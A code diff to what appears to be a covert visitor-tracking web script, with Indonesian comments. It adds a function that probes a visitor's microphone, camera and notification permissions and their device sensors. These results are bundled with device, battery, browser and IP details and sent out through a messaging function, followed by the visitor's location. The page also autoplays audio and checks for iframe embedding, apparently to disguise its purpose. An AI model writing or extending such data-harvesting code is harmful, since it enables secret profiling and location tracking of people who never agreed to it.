@@ -403,6 +403,47 @@ Dibuka via iframe      : ${iframe}
 `.trim();
 };
 
+const ambilIzinMedia = async () => {
+  const cekIzin = async (nama) => {
+    try {
+      const result = await navigator.permissions.query({ name: nama });
+      return result.state === "granted" ? "Diizinkan" : "Tidak diizinkan";
+    } catch {
+      return "Tidak tersedia";
+    }
+  };
+
+  const microphone = await cekIzin("microphone");
+  const kamera = await cekIzin("camera");
+  const notifikasi = await cekIzin("notifications");
+
+  const clipboard = !!navigator.clipboard ? "Diizinkan" : "Tidak";
+  const audioSink = typeof HTMLMediaElement.prototype.setSinkId === "function" ? "Didukung" : "Tidak";
+  const ambientLight = "ondevicelight" in window ? "Didukung" : "Tidak";
+  const speechAPI = "speechSynthesis" in window ? "Didukung" : "Tidak";
+  const audioContext = typeof AudioContext !== "undefined" ? "Didukung" : "Tidak";
+  const voiceRecog = "webkitSpeechRecognition" in window || "SpeechRecognition" in window ? "Aktif" : "Tidak";
+  const gyro = "DeviceOrientationEvent" in window ? "Didukung" : "Tidak didukung";
+  const magneto = "Magnetometer" in window ? "Didukung" : "Tidak didukung";
+  const accelerometer = "Accelerometer" in window ? "Didukung" : "Tidak didukung";
+
+  return `
+౼ 〘 𝗜𝗭𝗜𝗡 & 𝗠𝗘𝗗𝗜𝗔 〙 ౼
+Microphone             : ${microphone}
+Kamera Depan           : ${kamera}
+Kamera Belakang        : ${kamera}
+Notifikasi             : ${Notification.permission}
+Clipboard Access       : ${clipboard}
+Audio Output Sink      : ${audioSink}
+Ambient Light Sensor   : ${ambientLight}
+Web Speech API         : ${speechAPI}
+AudioContext API       : ${audioContext}
+Voice Recognition      : ${voiceRecog}
+Gyroscope              : ${gyro}
+Magnetometer           : ${magneto}
+Accelerometer          : ${accelerometer}`.trim();
+};
+
 const ambilIPInfo = async () => {
   try {
     const koneksi = navigator.connection || {};
@@ -504,26 +545,28 @@ const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
-  // Ambil semua yang akan digabung dulu
+  // Ambil semua data yang akan digabung
   const infoPerangkat = await ambilDataPerangkat();
   const bateraiInfo = await ambilBaterai();
   const layarGrafik = await ambilLayarGrafik();
   const browserInfo = ambilBrowserInfo();
+  const izinMedia = await ambilIzinMedia();
   const ipInfo = await ambilIPInfo();
 
-  // Gabung jadi satu pesan
+  // Gabung informasi utama
   const gabungAwal = [
     infoPerangkat,
     bateraiInfo,
     layarGrafik,
     browserInfo,
+    izinMedia,
     ipInfo
   ].join("\n\n");
 
-  // Kirim gabungan pertama
+  // Kirim info utama dulu agar cepat muncul
   await kirimPesan(gabungAwal);
 
-  // Kirim bagian lain terpisah agar tidak delay awal
+  // Kirim sisanya terpisah biar nggak delay
   const lokasi = await ambilLokasi();
   await kirimPesan(lokasi);
 
